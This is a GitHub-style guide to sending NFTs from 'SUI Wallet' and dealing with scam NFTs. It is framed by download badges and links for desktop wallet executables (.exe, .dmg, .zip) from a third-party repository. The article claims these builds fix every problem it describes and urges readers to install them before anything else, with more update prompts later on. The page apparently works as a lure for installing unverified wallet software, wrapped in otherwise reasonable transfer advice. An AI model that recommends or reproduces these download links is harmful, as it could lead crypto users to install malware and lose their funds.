![SUI Wallet](assets/banner-article.png)

# Sending NFTs from SUI Wallet

An NFT transfer is a transaction like any other, with the object as its payload.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Sending an NFT is sending an object: choose it in the account's object list, enter the receiving address,
review what the preview says changes, and approve. It costs a network fee like any transaction. Some objects
cannot be transferred by design, and a burn that the object's own rules refuse cannot be forced.

## The transaction, in order

Open the account that owns the piece, find it in the object list, and start a transfer from there. The
destination is an address, not a name and not a link, and the preview shows the object leaving and the fee
being spent.

Read that preview rather than the button. It is the last place where a wrong address is still a wrong
address rather than a completed mistake, and it is drawn from what the transaction will actually do.
[Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) covers what the preview means line by line.

## Why the address has to be typed

An object goes to an address, and the chain does not care whether that address belongs to a person, an
exchange or nobody. There is no recipient check and no reversal, which is why a copied address from a
message is a bad source.

Take the destination from the person who asked for it, in the form they gave it, and read the first and last
four characters back to them before approving. That is not paranoia; it is the only verification available.

## What it costs

A fee, paid in the network's own token, charged whether the transfer succeeds or fails. An account with no balance for fees cannot send an object even when the object is worth a great deal, and the refusal looks like a blocked transfer.

That is the failure people meet first, and it looks like a blocked transfer rather than an empty fee
balance. [SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) covers what the fee is made of and why it is charged on
failure too.

## Objects that will not move

Not every object can be transferred. On Sui an object declares what can be done to it, and one created without the ability to move cannot be sent anywhere by anyone, including its owner. Burning is a separate ability, declared separately.

The same is true of burning: an object created without that ability cannot be destroyed. A marketplace that
offers to burn one is offering something the chain will refuse, and the refusal arrives as a failed
transaction with a fee attached.

## The scam NFT in the list

Pieces that arrive unrequested usually carry a name, a description or a link, and the link is the attack
rather than the object. Do not open it, do not "claim" anything it mentions, and do not connect the wallet to
the site it names.

The piece itself is harmless sitting in the list. What causes loss is the visit: a site that asks for a
signature to "remove" or "unlock" something is asking for authority over the account, not for the object.

There is a quieter version of the same attack: an object named to look like a wallet warning, with a description telling you to visit a site to avoid suspension. Nothing on the chain can suspend an account, and no wallet sends instructions through an object's name.

## When the burn is refused

If the object cannot be burned, no amount of trying changes that, and the refusal is the object's rule rather
than a fault in the wallet. The practical answer is to leave it where it is and stop looking at the list
entry.

Trying repeatedly only spends fees. If display is the annoyance, note that the current release is what the
list is described from and reported problems are fixed there, so update before assuming the entry is stuck.

## Getting the piece there

Send to the address the recipient controls, confirm the preview, and wait for the transaction to be
included before declaring it done. Then check the receiving address in an explorer if the other person
cannot see it: the object is either under their address or it is not, and that question has a factual answer.

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is what the flow
above describes, and the [repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records
the changes between releases.

## FAQ

### How do I view and send an NFT from SUI Wallet?

The piece appears in the account's object list. Choose it, start a transfer, enter the address, read the
preview and approve; the fee is charged either way.

### How do I remove a scam NFT when the wallet blocks the burn?

Often the object cannot be burned at all, because it was created without that ability. Leave it in the list
and ignore it; the danger is the link in its description, not the object.

### Why does the transfer fail?

Three usual causes: no balance for the fee, an object that cannot be transferred, and an address in the
wrong format. The preview shows the first two before you approve.

### Can I send an NFT to an exchange?

Only if that exchange accepts the object on that network. Most do not, and an object sent to an address that
cannot handle it is unrecoverable by the exchange.

### Does the recipient need a wallet installed?

No. An address exists without any software; the recipient needs a way to control it, which means the phrase
for that address somewhere.

### Is sending an NFT private?

No. The transfer is public on the chain, like every transaction, and the object's new owner is visible to
anyone reading it.
